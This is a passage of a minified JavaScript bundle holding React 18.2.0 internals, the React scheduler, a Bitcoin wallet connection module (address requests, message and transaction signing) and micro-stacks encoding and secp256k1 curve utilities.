          (t.useMemo = function (e, t) {
            return _.current.useMemo(e, t);
          }),
          (t.useReducer = function (e, t, n) {
            return _.current.useReducer(e, t, n);
          }),
          (t.useRef = function (e) {
            return _.current.useRef(e);
          }),
          (t.useState = function (e) {
            return _.current.useState(e);
          }),
          (t.useSyncExternalStore = function (e, t, n) {
            return _.current.useSyncExternalStore(e, t, n);
          }),
          (t.useTransition = function () {
            return _.current.useTransition();
          }),
          (t.version = "18.2.0");
      },
      2791: (e, t, n) => {
        "use strict";
        e.exports = n(9117);
      },
      184: (e, t, n) => {
        "use strict";
        e.exports = n(6374);
      },
      5798: function (e, t, n) {
        "use strict";
        var r =
            (this && this.__createBinding) ||
            (Object.create
              ? function (e, t, n, r) {
                  void 0 === r && (r = n);
                  var i = Object.getOwnPropertyDescriptor(t, n);
                  (i &&
                    !("get" in i
                      ? !t.__esModule
                      : i.writable || i.configurable)) ||
                    (i = {
                      enumerable: !0,
                      get: function () {
                        return t[n];
                      },
                    }),
                    Object.defineProperty(e, r, i);
                }
              : function (e, t, n, r) {
                  void 0 === r && (r = n), (e[r] = t[n]);
                }),
          i =
            (this && this.__exportStar) ||
            function (e, t) {
              for (var n in e)
                "default" === n ||
                  Object.prototype.hasOwnProperty.call(t, n) ||
                  r(t, e, n);
            };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          i(n(9733), t),
          i(n(9390), t),
          i(n(5272), t),
          i(n(6027), t),
          i(n(9333), t);
      },
      9733: function (e, t, n) {
        "use strict";
        var r =
            (this && this.__createBinding) ||
            (Object.create
              ? function (e, t, n, r) {
                  void 0 === r && (r = n);
                  var i = Object.getOwnPropertyDescriptor(t, n);
                  (i &&
                    !("get" in i
                      ? !t.__esModule
                      : i.writable || i.configurable)) ||
                    (i = {
                      enumerable: !0,
                      get: function () {
                        return t[n];
                      },
                    }),
                    Object.defineProperty(e, r, i);
                }
              : function (e, t, n, r) {
                  void 0 === r && (r = n), (e[r] = t[n]);
                }),
          i =
            (this && this.__exportStar) ||
            function (e, t) {
              for (var n in e)
                "default" === n ||
                  Object.prototype.hasOwnProperty.call(t, n) ||
                  r(t, e, n);
            };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.getAddress = void 0);
        const o = n(4563);
        (t.getAddress = async (e) => {
          const { message: t, network: n, purposes: r } = e.payload,
            i = window.BitcoinProvider;
          if (!i) throw new Error("No Bitcoin Wallet installed");
          if (!r) throw new Error("Address purposes are required");
          try {
            var s;
            const t = (0, o.createUnsecuredToken)(e.payload),
              n = await i.connect(t);
            null === (s = e.onFinish) || void 0 === s || s.call(e, n);
          } catch (l) {
            var a;
            console.error("[Connect] Error during address request", l),
              null === (a = e.onCancel) || void 0 === a || a.call(e);
          }
        }),
          i(n(2670), t);
      },
      2670: (e, t) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.AddressPurposes = void 0),
          (function (e) {
            (e.PAYMENT = "payment"), (e.ORDINALS = "ordinals");
          })(t.AddressPurposes || (t.AddressPurposes = {}));
      },
      5272: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.callWalletPopup = t.CallMethod = void 0);
        const r = n(4563);
        !(function (e) {
          (e.SIGN_TRANSACTION = "signTransaction"),
            (e.GET_ADDRESS = "getAddress");
        })(t.CallMethod || (t.CallMethod = {}));
        t.callWalletPopup = async (e) => {
          const t = window.BitcoinProvider,
            { method: n } = e.payload;
          if (!t) throw new Error("No Bitcoin Wallet installed");
          if (!n) throw new Error("A wallet method is required");
          const i = (0, r.createUnsecuredToken)(e.payload);
          try {
            var o;
            const n = await t.call(i);
            null === (o = e.onFinish) || void 0 === o || o.call(e, n);
          } catch (a) {
            var s;
            console.error("[Connect] Error during call request", a),
              null === (s = e.onCancel) || void 0 === s || s.call(e);
          }
        };
      },
      9390: (e, t) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 });
      },
      9333: function (e, t, n) {
        "use strict";
        var r =
            (this && this.__createBinding) ||
            (Object.create
              ? function (e, t, n, r) {
                  void 0 === r && (r = n);
                  var i = Object.getOwnPropertyDescriptor(t, n);
                  (i &&
                    !("get" in i
                      ? !t.__esModule
                      : i.writable || i.configurable)) ||
                    (i = {
                      enumerable: !0,
                      get: function () {
                        return t[n];
                      },
                    }),
                    Object.defineProperty(e, r, i);
                }
              : function (e, t, n, r) {
                  void 0 === r && (r = n), (e[r] = t[n]);
                }),
          i =
            (this && this.__exportStar) ||
            function (e, t) {
              for (var n in e)
                "default" === n ||
                  Object.prototype.hasOwnProperty.call(t, n) ||
                  r(t, e, n);
            };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.signMessage = void 0);
        const o = n(4563);
        (t.signMessage = async (e) => {
          const t = window.BitcoinProvider;
          if (!t) throw new Error("No Bitcoin Wallet installed");
          try {
            var n;
            const r = (0, o.createUnsecuredToken)(e.payload),
              i = await t.signMessage(r);
            null === (n = e.onFinish) || void 0 === n || n.call(e, i);
          } catch (i) {
            var r;
            console.error("[Connect] Error during Signing request", i),
              null === (r = e.onCancel) || void 0 === r || r.call(e);
          }
        }),
          i(n(8814), t);
      },
      8814: (e, t) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 });
      },
      6027: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.signTransaction = void 0);
        const r = n(4563);
        t.signTransaction = async (e) => {
          const { psbtBase64: t, inputsToSign: n } = e.payload,
            i = window.BitcoinProvider;
          if (!i) throw new Error("No Bitcoin Wallet installed");
          if (!t)
            throw new Error(
              "a value for psbtBase64 representing the tx hash is required"
            );
          if (!n)
            throw new Error(
              "an array specifying the inputs to be signed by the wallet is required"
            );
          try {
            var o;
            const t = (0, r.createUnsecuredToken)(e.payload),
              n = await i.signTransaction(t);
            null === (o = e.onFinish) || void 0 === o || o.call(e, n);
          } catch (a) {
            var s;
            console.error("[Connect] Error during signPsbt request", a),
              null === (s = e.onCancel) || void 0 === s || s.call(e);
          }
        };
      },
      6813: (e, t) => {
        "use strict";
        function n(e, t) {
          var n = e.length;
          e.push(t);
          e: for (; 0 < n; ) {
            var r = (n - 1) >>> 1,
              i = e[r];
            if (!(0 < o(i, t))) break e;
            (e[r] = t), (e[n] = i), (n = r);
          }
        }
        function r(e) {
          return 0 === e.length ? null : e[0];
        }
        function i(e) {
          if (0 === e.length) return null;
          var t = e[0],
            n = e.pop();
          if (n !== t) {
            e[0] = n;
            e: for (var r = 0, i = e.length, s = i >>> 1; r < s; ) {
              var a = 2 * (r + 1) - 1,
                l = e[a],
                c = a + 1,
                u = e[c];
              if (0 > o(l, n))
                c < i && 0 > o(u, l)
                  ? ((e[r] = u), (e[c] = n), (r = c))
                  : ((e[r] = l), (e[a] = n), (r = a));
              else {
                if (!(c < i && 0 > o(u, n))) break e;
                (e[r] = u), (e[c] = n), (r = c);
              }
            }
          }
          return t;
        }
        function o(e, t) {
          var n = e.sortIndex - t.sortIndex;
          return 0 !== n ? n : e.id - t.id;
        }
        if (
          "object" === typeof performance &&
          "function" === typeof performance.now
        ) {
          var s = performance;
          t.unstable_now = function () {
            return s.now();
          };
        } else {
          var a = Date,
            l = a.now();
          t.unstable_now = function () {
            return a.now() - l;
          };
        }
        var c = [],
          u = [],
          f = 1,
          h = null,
          d = 3,
          p = !1,
          g = !1,
          y = !1,
          w = "function" === typeof setTimeout ? setTimeout : null,
          m = "function" === typeof clearTimeout ? clearTimeout : null,
          b = "undefined" !== typeof setImmediate ? setImmediate : null;
        function v(e) {
          for (var t = r(u); null !== t; ) {
            if (null === t.callback) i(u);
            else {
              if (!(t.startTime <= e)) break;
              i(u), (t.sortIndex = t.expirationTime), n(c, t);
            }
            t = r(u);
          }
        }
        function E(e) {
          if (((y = !1), v(e), !g))
            if (null !== r(c)) (g = !0), U(S);
            else {
              var t = r(u);
              null !== t && N(E, t.startTime - e);
            }
        }
        function S(e, n) {
          (g = !1), y && ((y = !1), m(T), (T = -1)), (p = !0);
          var o = d;
          try {
            for (
              v(n), h = r(c);
              null !== h && (!(h.expirationTime > n) || (e && !O()));

            ) {
              var s = h.callback;
              if ("function" === typeof s) {
                (h.callback = null), (d = h.priorityLevel);
                var a = s(h.expirationTime <= n);
                (n = t.unstable_now()),
                  "function" === typeof a
                    ? (h.callback = a)
                    : h === r(c) && i(c),
                  v(n);
              } else i(c);
              h = r(c);
            }
            if (null !== h) var l = !0;
            else {
              var f = r(u);
              null !== f && N(E, f.startTime - n), (l = !1);
            }
            return l;
          } finally {
            (h = null), (d = o), (p = !1);
          }
        }
        "undefined" !== typeof navigator &&
          void 0 !== navigator.scheduling &&
          void 0 !== navigator.scheduling.isInputPending &&
          navigator.scheduling.isInputPending.bind(navigator.scheduling);
        var x,
          A = !1,
          k = null,
          T = -1,
          C = 5,
          I = -1;
        function O() {
          return !(t.unstable_now() - I < C);
        }
        function B() {
          if (null !== k) {
            var e = t.unstable_now();
            I = e;
            var n = !0;
            try {
              n = k(!0, e);
            } finally {
              n ? x() : ((A = !1), (k = null));
            }
          } else A = !1;
        }
        if ("function" === typeof b)
          x = function () {
            b(B);
          };
        else if ("undefined" !== typeof MessageChannel) {
          var P = new MessageChannel(),
            _ = P.port2;
          (P.port1.onmessage = B),
            (x = function () {
              _.postMessage(null);
            });
        } else
          x = function () {
            w(B, 0);
          };
        function U(e) {
          (k = e), A || ((A = !0), x());
        }
        function N(e, n) {
          T = w(function () {
            e(t.unstable_now());
          }, n);
        }
        (t.unstable_IdlePriority = 5),
          (t.unstable_ImmediatePriority = 1),
          (t.unstable_LowPriority = 4),
          (t.unstable_NormalPriority = 3),
          (t.unstable_Profiling = null),
          (t.unstable_UserBlockingPriority = 2),
          (t.unstable_cancelCallback = function (e) {
            e.callback = null;
          }),
          (t.unstable_continueExecution = function () {
            g || p || ((g = !0), U(S));
          }),
          (t.unstable_forceFrameRate = function (e) {
            0 > e || 125 < e
              ? console.error(
                  "forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
                )
              : (C = 0 < e ? Math.floor(1e3 / e) : 5);
          }),
          (t.unstable_getCurrentPriorityLevel = function () {
            return d;
          }),
          (t.unstable_getFirstCallbackNode = function () {
            return r(c);
          }),
          (t.unstable_next = function (e) {
            switch (d) {
              case 1:
              case 2:
              case 3:
                var t = 3;
                break;
              default:
                t = d;
            }
            var n = d;
            d = t;
            try {
              return e();
            } finally {
              d = n;
            }
          }),
          (t.unstable_pauseExecution = function () {}),
          (t.unstable_requestPaint = function () {}),
          (t.unstable_runWithPriority = function (e, t) {
            switch (e) {
              case 1:
              case 2:
              case 3:
              case 4:
              case 5:
                break;
              default:
                e = 3;
            }
            var n = d;
            d = e;
            try {
              return t();
            } finally {
              d = n;
            }
          }),
          (t.unstable_scheduleCallback = function (e, i, o) {
            var s = t.unstable_now();
            switch (
              ("object" === typeof o && null !== o
                ? (o = "number" === typeof (o = o.delay) && 0 < o ? s + o : s)
                : (o = s),
              e)
            ) {
              case 1:
                var a = -1;
                break;
              case 2:
                a = 250;
                break;
              case 5:
                a = 1073741823;
                break;
              case 4:
                a = 1e4;
                break;
              default:
                a = 5e3;
            }
            return (
              (e = {
                id: f++,
                callback: i,
                priorityLevel: e,
                startTime: o,
                expirationTime: (a = o + a),
                sortIndex: -1,
              }),
              o > s
                ? ((e.sortIndex = o),
                  n(u, e),
                  null === r(c) &&
                    e === r(u) &&
                    (y ? (m(T), (T = -1)) : (y = !0), N(E, o - s)))
                : ((e.sortIndex = a), n(c, e), g || p || ((g = !0), U(S))),
              e
            );
          }),
          (t.unstable_shouldYield = O),
          (t.unstable_wrapCallback = function (e) {
            var t = d;
            return function () {
              var n = d;
              d = t;
              try {
                return e.apply(this, arguments);
              } finally {
                d = n;
              }
            };
          });
      },
      5296: (e, t, n) => {
        "use strict";
        e.exports = n(6813);
      },
      1561: (e, t, n) => {
        "use strict";
        var r = n(2791);
        var i =
            "function" === typeof Object.is
              ? Object.is
              : function (e, t) {
                  return (
                    (e === t && (0 !== e || 1 / e === 1 / t)) ||
                    (e !== e && t !== t)
                  );
                },
          o = r.useState,
          s = r.useEffect,
          a = r.useLayoutEffect,
          l = r.useDebugValue;
        function c(e) {
          var t = e.getSnapshot;
          e = e.value;
          try {
            var n = t();
            return !i(e, n);
          } catch (r) {
            return !0;
          }
        }
        var u =
          "undefined" === typeof window ||
          "undefined" === typeof window.document ||
          "undefined" === typeof window.document.createElement
            ? function (e, t) {
                return t();
              }
            : function (e, t) {
                var n = t(),
                  r = o({ inst: { value: n, getSnapshot: t } }),
                  i = r[0].inst,
                  u = r[1];
                return (
                  a(
                    function () {
                      (i.value = n),
                        (i.getSnapshot = t),
                        c(i) && u({ inst: i });
                    },
                    [e, n, t]
                  ),
                  s(
                    function () {
                      return (
                        c(i) && u({ inst: i }),
                        e(function () {
                          c(i) && u({ inst: i });
                        })
                      );
                    },
                    [e]
                  ),
                  l(n),
                  n
                );
              };
        t.useSyncExternalStore =
          void 0 !== r.useSyncExternalStore ? r.useSyncExternalStore : u;
      },
      7595: (e, t, n) => {
        "use strict";
        var r = n(2791),
          i = n(7248);
        var o =
            "function" === typeof Object.is
              ? Object.is
              : function (e, t) {
                  return (
                    (e === t && (0 !== e || 1 / e === 1 / t)) ||
                    (e !== e && t !== t)
                  );
                },
          s = i.useSyncExternalStore,
          a = r.useRef,
          l = r.useEffect,
          c = r.useMemo,
          u = r.useDebugValue;
        t.useSyncExternalStoreWithSelector = function (e, t, n, r, i) {
          var f = a(null);
          if (null === f.current) {
            var h = { hasValue: !1, value: null };
            f.current = h;
          } else h = f.current;
          f = c(
            function () {
              function e(e) {
                if (!l) {
                  if (
                    ((l = !0), (s = e), (e = r(e)), void 0 !== i && h.hasValue)
                  ) {
                    var t = h.value;
                    if (i(t, e)) return (a = t);
                  }
                  return (a = e);
                }
                if (((t = a), o(s, e))) return t;
                var n = r(e);
                return void 0 !== i && i(t, n) ? t : ((s = e), (a = n));
              }
              var s,
                a,
                l = !1,
                c = void 0 === n ? null : n;
              return [
                function () {
                  return e(t());
                },
                null === c
                  ? void 0
                  : function () {
                      return e(c());
                    },
              ];
            },
            [t, n, r, i]
          );
          var d = s(e, f[0], f[1]);
          return (
            l(
              function () {
                (h.hasValue = !0), (h.value = d);
              },
              [d]
            ),
            u(d),
            d
          );
        };
      },
      7248: (e, t, n) => {
        "use strict";
        e.exports = n(1561);
      },
      327: (e, t, n) => {
        "use strict";
        e.exports = n(7595);
      },
      5462: () => {},
      277: () => {},
      4218: () => {},
      5856: () => {},
      9159: () => {},
      8859: () => {},
      4471: () => {},
      8173: () => {},
      8971: () => {},
      5144: (e, t, n) => {
        "use strict";
        n.d(t, { de: () => Do });
        var r = n(2791),
          i = n(327);
        function o(e) {
          return (
            (o =
              "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
                ? function (e) {
                    return typeof e;
                  }
                : function (e) {
                    return e &&
                      "function" == typeof Symbol &&
                      e.constructor === Symbol &&
                      e !== Symbol.prototype
                      ? "symbol"
                      : typeof e;
                  }),
            o(e)
          );
        }
        function s(e) {
          var t = (function (e, t) {
            if ("object" !== o(e) || null === e) return e;
            var n = e[Symbol.toPrimitive];
            if (void 0 !== n) {
              var r = n.call(e, t || "default");
              if ("object" !== o(r)) return r;
              throw new TypeError(
                "@@toPrimitive must return a primitive value."
              );
            }
            return ("string" === t ? String : Number)(e);
          })(e, "string");
          return "symbol" === o(t) ? t : String(t);
        }
        function a(e, t, n) {
          return (
            (t = s(t)) in e
              ? Object.defineProperty(e, t, {
                  value: n,
                  enumerable: !0,
                  configurable: !0,
                  writable: !0,
                })
              : (e[t] = n),
            e
          );
        }
        function l(e) {
          if (ArrayBuffer.isView(e))
            return new Uint8Array(e.buffer, e.byteOffset, e.byteLength);
          throw new Error("Non array buffer passed to arrayBufferToUint8");
        }
        function c(e) {
          let t,
            {
              throwIfUnavailable: n,
              usageDesc: r,
              returnEmptyObject: i,
            } = arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : {};
          try {
            if (
              ((t = (function () {
                if (typeof self < "u") return self;
                if (typeof window < "u") return window;
                if (typeof global < "u") return global;
                throw new Error(
                  "Unexpected runtime environment - no supported global scope (`window`, `self`, `global`) available"
                );
              })()),
              t)
            ) {
              let n = t[e];
              if (n) return n;
            }
          } catch (hn) {
            console.error(
              `Error getting object '${e}' from global scope '${t}': ${hn}`
            );
          }
          if (n) {
            let n = (function (e, t, n) {
              return n
                ? `Use of '${n}' requires \`${t}\` which is unavailable on the '${e}' object within the currently executing environment.`
                : `\`${t}\` is unavailable on the '${e}' object within the currently executing environment.`;
            })(t, e.toString(), r);
            throw (console.error(n), new Error(n));
          }
          if (i) return {};
        }
        function u(e) {
          let t = e.reduce((e, t) => e + t.length, 0),
            n = new Uint8Array(t),
            r = 0;
          for (let i = 0; i < e.length; i++) n.set(e[i], r), (r += e[i].length);
          return n;
        }
        function f(e) {
          return "object" == typeof e && (e = Uint8Array.from(e)), e;
        }
        function h(e) {
          return new TextEncoder().encode(e);
        }
        var d = new Array(255);
        for (let Mo = 0; Mo <= 255; ++Mo)
          d[Mo] = Mo.toString(16).padStart(2, "0");
        function p(e) {
          if ("string" != typeof e)
            throw new TypeError("hexToBytes: expected string, got " + typeof e);
          if ((e.startsWith("0x") && (e = v(e)), e.length % 2))
            throw new Error(
              `hexToBytes: received invalid unpadded hex, got: ${e.length}`
            );
          let t = new Uint8Array(e.length / 2);
          for (let n = 0; n < t.length; n++) {
            let r = 2 * n;
            t[n] = Number.parseInt(e.slice(r, r + 2), 16);
          }
          return t;
        }
        function g(e) {
          let t = new Array(e.length);
          for (let n = 0; n < e.length; ++n) t[n] = d[e[n]];
          return t.join("");
        }
        function y(e) {
          if ("string" != typeof e)
            throw new TypeError(
              "hexToNumber: expected string, got " + typeof e
            );
          return BigInt(`0x${e}`);
        }
        var w = function (e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 8;
            return ("bigint" == typeof e ? e : x(e, !1))
              .toString(16)
              .padStart(2 * t, "0");
          },
          m = (e) =>
            JSON.parse(
              (function (e) {
                return new TextDecoder().decode(e);
              })(p(e))
            ),
          b = (e) => ("string" == typeof e ? p(e) : e),
          v = (e) => (e.startsWith("0x") ? e.replace("0x", "") : e),
          E = BigInt(0),
          S = BigInt(1);
        function x(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          if ("number" == typeof e) {
            if (!Number.isInteger(e))
              throw new RangeError(
                "Invalid value. Values of type 'number' must be an integer."
              );
            return BigInt(e);
          }
          if ("string" == typeof e)
            if (e.toLowerCase().startsWith("0x")) {
              let t = e.slice(2);
              (t = t.padStart(t.length + (t.length % 2), "0")), (e = p(t));
            } else
              try {
                return BigInt(e);
              } catch (Y) {
                if (Y instanceof SyntaxError)
                  throw new RangeError(
                    `Invalid value. String integer '${e}' is not finite.`
                  );
              }
          if ("bigint" == typeof e) return e;
          if (e instanceof Uint8Array)
            return t
              ? (function (e) {
                  let t =
                    arguments.length > 1 && void 0 !== arguments[1]
                      ? arguments[1]
                      : 128;
                  return (
                    (e & (S << (BigInt(t) - S))) > E && (e -= S << BigInt(t)), e
                  );
                })(y(g(e)))
              : y(g(e));
          if (
            (function (e) {
              var t;
              return (
                null !== e &&
                "object" == typeof e &&
                26 ===
                  (null == (t = null == e ? void 0 : e.constructor)
                    ? void 0
                    : t.wordSize) &&
                Array.isArray(null == e ? void 0 : e.words)
              );
            })(e)
          )
            return BigInt(e.toString());
          throw new TypeError(
            `Invalid value type. Must be a number, bigint, integer-string, hex-string, BN.js instance, or Buffer, got: ${typeof e}.`
          );
        }
        function A(e) {
          return `[micro-stacks] ${e}`;
        }
        var k = class extends Error {
          constructor(e) {
            super(e),
              (this.message = A(e)),
              (this.name = this.constructor.name);
          }
        };
        var T =
          typeof window < "u"
            ? { referrer: "no-referrer", referrerPolicy: "no-referrer" }
            : {};
        async function C(e) {
          return fetch(e, {
            ...T,
            ...(arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : {}),
          });
        }
        var I =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
          O =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
        function B(e) {
          let t = e.length;
          if (t % 4 > 0)
            throw new Error("Invalid string. Length must be a multiple of 4");
          let n = e.indexOf("=");
          return -1 === n && (n = t), [n, n === t ? 0 : 4 - (n % 4)];
        }
        function P(e, t) {
          let n,
            r,
            { revLookup: i } = $(t),
            o = B(e),
            s = o[0],
            a = o[1],
            l = new Uint8Array(
              (function (e, t, n) {
                return (3 * (t + n)) / 4 - n;
              })(0, s, a)
            ),
            c = 0,
            u = a > 0 ? s - 4 : s;
          for (r = 0; r < u; r += 4)
            (n =
              (i[e.charCodeAt(r)] << 18) |
              (i[e.charCodeAt(r + 1)] << 12) |
              (i[e.charCodeAt(r + 2)] << 6) |
              i[e.charCodeAt(r + 3)]),
              (l[c++] = (n >> 16) & 255),
              (l[c++] = (n >> 8) & 255),
              (l[c++] = 255 & n);
          return (
            2 === a &&
              ((n = (i[e.charCodeAt(r)] << 2) | (i[e.charCodeAt(r + 1)] >> 4)),
              (l[c++] = 255 & n)),
            1 === a &&
              ((n =
                (i[e.charCodeAt(r)] << 10) |
                (i[e.charCodeAt(r + 1)] << 4) |
                (i[e.charCodeAt(r + 2)] >> 2)),
              (l[c++] = (n >> 8) & 255),
              (l[c++] = 255 & n)),
            l
          );
        }
        function _(e) {
          let t = e.length,
            n = t % 4;
          if (!n) return e;
          let r = t + (4 - n);
          return e.padEnd(r, "=");
        }
        function U(e) {
          return P(_(e), I);
        }
        function N(e, t) {
          let { lookup: n } = $(t);
          return (
            n[(e >> 18) & 63] + n[(e >> 12) & 63] + n[(e >> 6) & 63] + n[63 & e]
          );
        }
        function R(e, t, n, r) {
          let i,
            o = [];
          for (let s = t; s < n; s += 3)
            (i =
              ((e[s] << 16) & 16711680) +
              ((e[s + 1] << 8) & 65280) +
              (255 & e[s + 2])),
              o.push(N(i, r));
          return o.join("");
        }
        var L = new Map();
        function $(e) {
          if (L.has(e)) return L.get(e);
          let t = [],
            n = [];
          for (let r = 0, i = e.length; r < i; ++r)
            (t[r] = e[r]), (n[e.charCodeAt(r)] = r);
          return (
            (n["-".charCodeAt(0)] = 62),
            (n["_".charCodeAt(0)] = 63),
            L.set(e, { lookup: t, revLookup: n }),
            { lookup: t, revLookup: n }
          );
        }
        function H(e, t) {
          let n,
            { lookup: r } = $(t),
            i = e.length,
            o = i % 3,
            s = [],
            a = 16383;
          for (let l = 0, c = i - o; l < c; l += a)
            s.push(R(e, l, l + a > c ? c : l + a, t));
          return (
            1 === o
              ? ((n = e[i - 1]), s.push(r[n >> 2] + r[(n << 4) & 63] + "=="))
              : 2 === o &&
                ((n = (e[i - 2] << 8) + e[i - 1]),
                s.push(r[n >> 10] + r[(n >> 4) & 63] + r[(n << 2) & 63] + "=")),
            s.join("")
          );
        }
        function D(e) {
          return H(e, I);
        }
        function M(e) {
          return H(e, O);
        }
        var F = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",
          j = BigInt(58);
        function z(e) {
          let t = [];
          for (let n = 0; n < e.length; ++n) t.push(255 & e.charCodeAt(n));
          return new Uint8Array(t);
        }
        function K(e, t, n, r, i) {
          if (
            (r || (r = 0),
            !i && 0 !== i && (i = e.length),
            n >= t.length && (n = t.length),
            n || (n = 0),
            i > 0 && i < r && (i = r),
            i === r || 0 === t.length || 0 === e.length)
          )
            return 0;
          if (n < 0) throw new RangeError("targetStart out of bounds");
          if (r < 0 || r >= e.length)
            throw new RangeError("Index out of range");
          if (i < 0) throw new RangeError("sourceEnd out of bounds");
          i > e.length && (i = e.length),
            t.length - n < i - r && (i = t.length - n + r);
          let o = i - r;
          return (
            e === t && "function" == typeof Uint8Array.prototype.copyWithin
              ? e.copyWithin(n, r, i)
              : Uint8Array.prototype.set.call(t, e.subarray(r, i), n),
            o
          );
        }
        var W = class {
          constructor() {
            a(this, "_value", []);
          }
          get value() {
            return this._value;
          }
          appendHexString(e) {
            this.value.push(p(e));
          }
          push(e) {
            return this._value.push(e);
          }
          appendByte(e) {
            if (!Number.isInteger(e) || e < 0 || e > 255)
              throw new Error(`Value ${e} is not a valid byte`);
            this.value.push(Uint8Array.from([e]));
          }
          concatBuffer() {
            return u(this.value);
          }
        };
        function V(e, t, n) {
          return (t = +t), (e[(n >>>= 0)] = 255 & t), n + 1;
        }
        function q(e, t, n) {
          return (
            (t = +t),
            (e[(n >>>= 0) + 3] = t >>> 24),
            (e[n + 2] = t >>> 16),
            (e[n + 1] = t >>> 8),
            (e[n] = 255 & t),
            n + 4
          );
        }
        function G(e, t) {
          return (
            e instanceof t ||
            (null != e &&
              null != e.constructor &&
              null != e.constructor.name &&
              e.constructor.name === t.name)
          );
        }
        new Map();
        var Y,
          Z =
            (((Y = Z || {})[(Y.Testnet = 2147483648)] = "Testnet"),
            (Y[(Y.Mainnet = 1)] = "Mainnet"),
            Y),
          J = ((e) => (
            (e[(e.Mainnet = 0)] = "Mainnet"),
            (e[(e.Testnet = 128)] = "Testnet"),
            e
          ))(J || {}),
          X = n(5856),
          Q = n.t(X, 2);
        const ee = BigInt(0),
          te = BigInt(1),
          ne = BigInt(2),
          re = BigInt(3),
          ie = BigInt(8),
          oe = ne ** BigInt(256),
          se = {
            a: ee,
            b: BigInt(7),
            P: oe - ne ** BigInt(32) - BigInt(977),
            n: oe - BigInt("432420386565659656852420866394968145599"),
            h: te,
            Gx: BigInt(
              "55066263022277343669578718895168534326250603453777594175500187360389116729240"
            ),
            Gy: BigInt(
              "32670510020758816978083085130507043184471273380659243275938904335757337482424"
            ),
            beta: BigInt(
              "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
            ),
          };
        function ae(e) {
          const { a: t, b: n } = se,
            r = Ce(e * e),
            i = Ce(r * e);
          return Ce(i + t * e + n);
        }
        const le = se.a === ee;
        class ce {
          constructor(e, t, n) {
            (this.x = e), (this.y = t), (this.z = n);
          }
          static fromAffine(e) {
            if (!(e instanceof fe))
              throw new TypeError("JacobianPoint#fromAffine: expected Point");
            return new ce(e.x, e.y, te);
          }
          static toAffineBatch(e) {
            const t = (function (e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : se.P;
              const n = new Array(e.length),
                r = e.reduce(
                  (e, r, i) => (r === ee ? e : ((n[i] = e), Ce(e * r, t))),
                  te
                ),
                i = Oe(r, t);
              return (
                e.reduceRight(
                  (e, r, i) =>
                    r === ee ? e : ((n[i] = Ce(e * n[i], t)), Ce(e * r, t)),
                  i
                ),
                n
              );
            })(e.map((e) => e.z));
            return e.map((e, n) => e.toAffine(t[n]));
          }
          static normalizeZ(e) {
            return ce.toAffineBatch(e).map(ce.fromAffine);
          }
          equals(e) {
            if (!(e instanceof ce))
              throw new TypeError("JacobianPoint expected");
            const { x: t, y: n, z: r } = this,
              { x: i, y: o, z: s } = e,
              a = Ce(r ** ne),
              l = Ce(s ** ne),
              c = Ce(t * l),
              u = Ce(i * a),
              f = Ce(Ce(n * s) * l),
              h = Ce(Ce(o * r) * a);
            return c === u && f === h;
          }
          negate() {
            return new ce(this.x, Ce(-this.y), this.z);
          }
          double() {
            const { x: e, y: t, z: n } = this,
              r = Ce(e ** ne),
              i = Ce(t ** ne),
              o = Ce(i ** ne),
              s = Ce(ne * (Ce((e + i) ** ne) - r - o)),
              a = Ce(re * r),
              l = Ce(a ** ne),
              c = Ce(l - ne * s),
              u = Ce(a * (s - c) - ie * o),
              f = Ce(ne * t * n);
            return new ce(c, u, f);
          }
          add(e) {
            if (!(e instanceof ce))
              throw new TypeError("JacobianPoint expected");
            const { x: t, y: n, z: r } = this,
              { x: i, y: o, z: s } = e;
            if (i === ee || o === ee) return this;
            if (t === ee || n === ee) return e;
            const a = Ce(r ** ne),
              l = Ce(s ** ne),
              c = Ce(t * l),
              u = Ce(i * a),
              f = Ce(Ce(n * s) * l),
              h = Ce(Ce(o * r) * a),
              d = Ce(u - c),
              p = Ce(h - f);
            if (d === ee) return p === ee ? this.double() : ce.ZERO;
            const g = Ce(d ** ne),
              y = Ce(d * g),
              w = Ce(c * g),
              m = Ce(p ** ne - y - ne * w),
              b = Ce(p * (w - m) - f * y),
              v = Ce(r * s * d);
            return new ce(m, b, v);
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiplyUnsafe(e) {
            const t = ce.ZERO;
            if ("bigint" === typeof e && e === ee) return t;
            let n = Te(e);
            if (n === te) return this;
            if (!le) {
              let e = t,
                r = this;
              for (; n > ee; )
                n & te && (e = e.add(r)), (r = r.double()), (n >>= te);
              return e;
            }
            let { k1neg: r, k1: i, k2neg: o, k2: s } = _e(n),
              a = t,
              l = t,
              c = this;
            for (; i > ee || s > ee; )
              i & te && (a = a.add(c)),
                s & te && (l = l.add(c)),
                (c = c.double()),
                (i >>= te),
                (s >>= te);
            return (
              r && (a = a.negate()),
              o && (l = l.negate()),
              (l = new ce(Ce(l.x * se.beta), l.y, l.z)),
              a.add(l)
            );
          }
          precomputeWindow(e) {
            const t = le ? 128 / e + 1 : 256 / e + 1,
              n = [];
            let r = this,
              i = r;
            for (let o = 0; o < t; o++) {
              (i = r), n.push(i);
              for (let t = 1; t < 2 ** (e - 1); t++) (i = i.add(r)), n.push(i);
              r = i.double();
            }
            return n;
          }
          wNAF(e, t) {
            !t && this.equals(ce.BASE) && (t = fe.BASE);
